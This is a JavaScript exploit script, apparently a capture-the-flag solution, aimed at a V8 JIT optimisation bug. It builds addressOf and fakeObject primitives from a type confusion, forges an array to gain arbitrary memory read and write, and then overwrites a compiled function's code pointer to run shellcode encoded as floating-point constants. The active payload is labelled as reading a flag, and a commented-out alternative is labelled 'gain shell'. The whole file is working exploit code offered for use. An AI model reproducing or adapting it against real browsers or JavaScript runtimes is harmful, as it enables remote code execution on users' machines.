var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);

// function gc() {
//     for (let i=0;i<0x10;i++) new ArrayBuffer(0x1000000);
// }

// function js_heap_defragment() {
//     gc();
//     for (let i=0;i<0x1000;i++) new ArrayBuffer(0x10);
//     for (let i=0;i<0x1000;i++) new Uint32Array(1);
// }


function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}

function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}

function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}

function f64_to_u32_lo(val){
    f64[0] = val;
    return u32[0];
}

function f64_to_u32_hi(val){
    f64[0] = val;
    return u32[1];
}

// function stop(){
//     %SystemBreak();
// }

// function p(arg){
//     %DebugPrint(arg);
// }

function spin(){
    while(1){};
}

function hex(str){
    return str.toString(16).padStart(16,0);
}

function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}



// catflag
const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}


// // gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}

for(let i = 0; i< 0x10000; i++){
    shellcode();
}

// js_heap_defragment();


function addressOf(obj){
    let array;
    let address;
    let flag;

    function bypass(obj){
        if(flag) {
            // p(array);
            array[2] = obj;
            // p(array);
        }
    }
    
    function trigger(arr,idx){
        for (let i = 0; i < 0x10000; i++){};
        array[0] = 3.3;
        if(flag || idx < 1){
            bypass(obj);
        }
        return arr[1];
    }

    flag = false;
    for(let i = 0; i < 0x1000; i++){
        array = [1.1,2.2,3.3];
        trigger(array,i);
    }

    flag = true;
    address = trigger(array,obj);
    return f64_to_u32_lo(address);
}

var shellcode_addr = addressOf(shellcode);

// p(fake_array);
// p(shellcode);

// p(double_array_map);
logg("shellcode_addr",shellcode_addr);



function fakeObject(addr){
    let array;
    let flag;
    function bypass(addr){
        if(flag) {
            // p(array);
            array[2] = {};
            // p(array);
        }
    }
    
    function trigger(arr,idx,addr){
        for (let i = 0; i < 0x10000; i++){};
        array[0] = 3.3;
        if(flag || idx < 1){
            bypass(addr);
        }
        array[0] = lh_u32_to_f64(addr,0);
    }

    flag = false;
    for(let i = 0; i < 0x1000; i++){
        array = [1.1,2.2,3.3];
        trigger(array,i,addr);
    }

    flag = true;
    trigger(array,0x0,addr);
    return array[0];
}

// var double_array_map = [
//     u64_to_f64(0x31040404001c01b5n),
//     u64_to_f64(0x0a8007ff11000844n)
// ];

var double_array_map_addr = 0x1cb7f9;


var fake_array = [
    lh_u32_to_f64(double_array_map_addr,0x0),
    lh_u32_to_f64(0x0,0x1000)
];

var fake_array_addr = addressOf(fake_array)+0x54;

// p(fake_array);


logg("double_array_map_addr",double_array_map_addr);
logg("fake_array_addr",fake_array_addr);

var fake_obj = fakeObject(fake_array_addr);
// console.log(typeof fake_obj);

function AAR(addr){
    fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
    return f64_to_u64(fake_obj[0]);
}

function AAW(addr,val){
    fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
    fake_obj[0] = u64_to_f64(val);
}
var code_addr = u64_to_u32_lo(AAR(shellcode_addr+0xc));
var ins_base = AAR((code_addr)+0x14);


logg("code_addr",code_addr);
logg("ins_base",ins_base);

AAW(code_addr+0x14,(BigInt(ins_base)+0x6bn));

// stop();
shellcode();

// spin();